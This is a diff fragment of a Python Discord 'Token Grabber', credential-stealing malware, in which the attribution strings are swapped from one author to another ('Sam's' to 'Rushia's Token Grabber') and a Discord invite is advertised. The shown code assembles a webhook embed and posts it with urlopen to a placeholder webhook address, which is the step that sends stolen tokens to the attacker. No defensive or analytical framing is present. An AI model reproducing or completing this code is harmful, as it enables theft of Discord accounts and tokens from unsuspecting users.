@@ -137,7 +137,7 @@ def main():
                 "color": 0xff00cd,
                 "fields": [
                     {
-                        "name": "Made by Rushia.BasH. Pasted by S4M_V1 :)",
+                        "name": "Made by Rushia.BasH",
                         "value": f'Join our discord server https://discord.gg/Pw4GxgKzsk',
                         "inline": False
                     },
@@ -170,8 +170,8 @@ def main():
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Sam's Token Grabber",
-        "avatar_url": "https://cdn.discordapp.com/attachments/757238634377248900/910923758183796736/4ff1cd281fba2902187c400e93d4589c.jpg"
+        "username": "Rushia's Token Grabber",
+        "avatar_url": "https://cdn.discordapp.com/attachments/756524108459540582/907284779022569472/500x500.jpg"
     }
     try:                #webhook under this message
         urlopen(Request("#webhook here", data=dumps(webhook).encode(), headers=getheaders()))
